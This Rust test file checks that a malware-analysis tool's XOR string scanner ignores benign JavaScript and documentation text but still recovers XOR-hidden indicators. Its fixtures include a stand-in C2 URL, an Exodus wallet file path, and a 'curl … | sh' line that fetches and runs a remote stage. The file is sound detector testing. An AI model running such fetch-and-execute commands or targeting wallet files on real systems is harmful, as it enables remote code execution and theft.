#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
//! XOR scanning must not invent hidden payloads inside ordinary text files.
//!
//! Regression coverage for the gauntlet-fp-small finding: a benign bundled
//! JavaScript file produced ~40,000 "XOR-decoded" strings, each of which
//! cleave then materialized as a decoded child node and analyzed. The cause was
//! statistical, not a parsing bug — the XOR scan's trigger patterns are 3-6
//! bytes long and are searched for under all 254 candidate keys, so in
//! megabytes of printable text some window matches by chance. Because
//! printable ^ key frequently stays printable, expansion around each collision
//! then yields plausible-looking junk.
//!
//! These tests exercise the whole `extract_strings_with_options` path, the way
//! filefacts calls it, and assert both directions: nothing is recovered from
//! text that hides nothing, and genuinely hidden strings are still recovered.

use stng::{ExtractOptions, StringMethod};

/// The options filefacts uses for source files (see
/// `filefacts/src/formats/common.rs::string_opts_for`).
fn source_file_opts() -> ExtractOptions {
    ExtractOptions::new(4)
        .with_garbage_filter(true)
        .with_caller_provides_symbols(true)
        .with_xor(None)
}

fn xor_strings(data: &[u8], opts: &ExtractOptions) -> Vec<String> {
    stng::extract_strings_with_options(data, opts)
        .into_iter()
        .filter(|s| s.method == StringMethod::XorDecode)
        .map(|s| s.value)
        .collect()
}

/// A minified JS bundle: long lines, dense punctuation, URLs and file
/// extensions — exactly the content that collides with the trigger patterns.
///
/// The byte *variety* matters as much as the size. Chance collisions need many
/// distinct 3-6 byte windows, so a fixture that repeats one template produces
/// far fewer than real minified output; identifiers, string literals and
/// numbers here are varied by a deterministic PRNG (fixed seed, so the test is
/// reproducible) to match the entropy of a genuine bundle.
fn bundled_javascript() -> String {
    // xorshift64*, inlined to keep the fixture dependency-free and stable.
    let mut state = 0x2545_F491_4F6C_DD1Du64;
    let mut next = move || {
        state ^= state >> 12;
        state ^= state << 25;
        state ^= state >> 27;
        state.wrapping_mul(0x2545_F491_4F6C_DD1D)
    };
    let mut token = move |len: usize| -> String {
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$";
        (0..len)
            .map(|_| ALPHABET[(next() % ALPHABET.len() as u64) as usize] as char)
            .collect()
    };

    let mut src = String::new();
    src.push_str("(function(){\"use strict\";var __webpack_modules__={};\n");
    for i in 0..600 {
        let (f, a, b, c, path, msg) = (
            token(8),
            token(3),
            token(4),
            token(6),
            token(12),
            token(20),
        );
        src.push_str(&format!(
            "__webpack_modules__[{i}]=function({a},{b},{c}){{var {f}={c}({i}),{a}{b}={f}.default||{f};{b}.exports=function({a}_,{b}_){{return fetch(\"https://cdn.example.com/{path}/chunk-{i}.js?v=\"+{a}_,{{method:\"POST\",headers:{{\"content-type\":\"application/json\",\"x-trace\":\"{msg}\"}}}}).then(function({c}_){{return {c}_.json()}}).catch(function(e){{console.error(\"{msg} failed: \"+e.message,\"{path}.exe\",\"{f}.dll\",\"C:\\\\Program Files\\\\{f}\")}})}}}};\n"
        ));
    }
    src.push_str("})();\n");
    src
}

#[test]
fn benign_bundled_javascript_yields_no_xor_decodes() {
    let src = bundled_javascript();
    assert!(
        src.len() > 150_000,
        "fixture must be large enough for chance collisions: {} bytes",
        src.len()
    );

    let found = xor_strings(src.as_bytes(), &source_file_opts());

    assert!(
        found.is_empty(),
        "benign minified JavaScript must produce no XOR decodes, got {}: {:?}",
        found.len(),
        &found[..found.len().min(10)]
    );
}

#[test]
fn benign_prose_yields_no_xor_decodes() {
    // Documentation-shaped text: the other big benign population in the corpus
    // (READMEs, licenses, changelogs shipped inside packages).
    let mut doc = String::new();
    for i in 0..2000 {
        doc.push_str(&format!(
            "Section {i}: install the package from https://registry.example.com/pkg and run setup.exe on Windows or ./configure on Unix systems.\n"
        ));
    }

    let found = xor_strings(doc.as_bytes(), &source_file_opts());

    assert!(
        found.is_empty(),
        "benign prose must produce no XOR decodes, got {}: {:?}",
        found.len(),
        &found[..found.len().min(10)]
    );
}

#[test]
fn hidden_payload_in_binary_is_still_recovered() {
    // The true positive the scan exists for: indicators XOR'd into a binary,
    // surrounded by the NUL/opcode noise of a real executable.
    let secrets = [
        "http://c2.evil-example.com/gate.php",
        "/Users/victim/Library/Application Support/Exodus/exodus.wallet",
        "/bin/sh -c curl http://c2.evil-example.com/stage2 | sh",
    ];
    let key = 0x5Au8;

    let mut data: Vec<u8> = Vec::new();
    data.extend(std::iter::repeat_n(0x00, 256));
    for secret in &secrets {
        data.extend(secret.bytes().map(|b| b ^ key));
        // NUL separation, the way strings sit in a real .rodata section.
        data.extend(std::iter::repeat_n(0x00, 8));
    }
    data.extend(std::iter::repeat_n(0x00, 256));

    let found = xor_strings(&data, &source_file_opts());

    // Each indicator must be recovered by its distinctive part, so a short
    // fragment of unrelated junk cannot satisfy the assertion.
    for marker in [
        "c2.evil-example.com/gate.php",
        "Library/Application Support/Exodus",
        "curl http://c2.evil-example.com/stage2",
    ] {
        assert!(
            found.iter().any(|v| v.contains(marker)),
            "hidden indicator {marker:?} must still be recovered; found {found:?}"
        );
    }
}

#[test]
fn hidden_payload_appended_to_benign_source_is_recovered() {
    // The case that proves the gate is content-local rather than file-global:
    // a benign script that also carries a genuinely obfuscated blob. The
    // benign bulk must stay silent while the blob is still recovered.
    let mut data = bundled_javascript().into_bytes();

    let key = 0x5Au8;
    let secret = "http://c2.evil-example.com/implant.bin";
    data.extend(std::iter::repeat_n(0x00, 8));
    data.extend(secret.bytes().map(|b| b ^ key));
    data.extend(std::iter::repeat_n(0x00, 8));

    let found = xor_strings(&data, &source_file_opts());

    assert!(
        found.iter().any(|v| v.contains("c2.evil-example.com")),
        "the obfuscated blob must be recovered from a mostly-benign file; found {found:?}"
    );
    assert!(
        found.len() < 10,
        "the benign bulk must stay silent, got {} decodes: {:?}",
        found.len(),
        &found[..found.len().min(10)]
    );
}
